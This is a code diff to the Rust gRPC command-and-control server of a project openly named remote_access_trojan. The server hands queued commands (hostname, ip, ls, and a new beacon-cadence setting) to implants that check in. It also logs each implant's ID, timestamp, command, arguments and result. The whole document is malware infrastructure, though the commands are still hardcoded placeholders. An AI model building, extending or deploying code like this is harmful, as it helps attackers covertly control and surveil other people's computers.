@@ -2,8 +2,27 @@ use remote_access_trojan::rat::RatCommand;
 use remote_access_trojan::rat::ask_for_instructions_server::{AskForInstructions, AskForInstructionsServer};
 use remote_access_trojan::rat::record_command_result_server::{RecordCommandResult, RecordCommandResultServer};
 use remote_access_trojan::rat::{Beacon, Empty, CommandRequest, CommandResponse};
+use std::collections::HashMap;
+use std::fmt;
 use tonic::{Request, Response, Status};
 use tonic::transport::Server;
+
+#[derive(Debug)]
+struct FormattableRatCommand(RatCommand);
+
+impl fmt::Display for FormattableRatCommand {
+    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
+        write!(f, "{self:?}")
+    }
+}
+
+fn pretty_print_command(command: RatCommand) -> String {
+    let command = FormattableRatCommand(command).to_string();
+    let command: Vec<&str> = command.split("(").collect();
+    let command = command[command.len() - 1];
+    let command: Vec<&str> = command.split(")").collect();
+    command[0].to_lowercase().to_string()
+}
 
 #[derive(Default)]
 pub struct MyAskForInstructions {}
@@ -11,13 +30,18 @@ pub struct MyAskForInstructions {}
 #[tonic::async_trait]
 impl AskForInstructions for MyAskForInstructions {
     async fn send(&self, request: Request<Beacon>) -> Result<Response<CommandRequest>, Status> {
-        let fake_commands: Vec<RatCommand> = vec![RatCommand::Hostname, RatCommand::Ip, RatCommand::Ls];
+        let fake_commands = HashMap::from([
+            (0, (RatCommand::Hostname, "".to_string())),
+            (1, (RatCommand::Ip, "".to_string())),
+            (2, (RatCommand::Ls, "".to_string())),
+            (3, (RatCommand::Cadence, "2".to_string())),
+        ]);
         let number: usize = request.into_inner().requested_command.try_into().unwrap();
         if fake_commands.len() > number {
             Ok(Response::new(
                 CommandRequest {
-                    command: RatCommand::try_into(fake_commands[number]).unwrap(),
-                    arguments:String::from("")
+                    command: RatCommand::try_into(fake_commands[&number].0).unwrap(),
+                    arguments: fake_commands[&number].1.clone()
                 }
             ))
         } else {
@@ -28,7 +52,6 @@ impl AskForInstructions for MyAskForInstructions {
                 }
             ))
         }
-        
     }
 }
 
@@ -41,9 +64,10 @@ impl RecordCommandResult for MyRecordCommandResult {
         let request = request.into_inner();
         let implant_id = request.implant_id;
         let timestamp = request.timestamp;
-        let command = request.command.to_string();
+        let command = pretty_print_command(RatCommand::from_i32(request.command).unwrap());
+        let arguments = request.arguments;
         let result = request.result;
-        println!("{implant_id},{timestamp},{command},{result}");
+        println!("{implant_id},{timestamp},{command},{arguments},{result}");
         Ok(Response::new(
             Empty {}
         ))
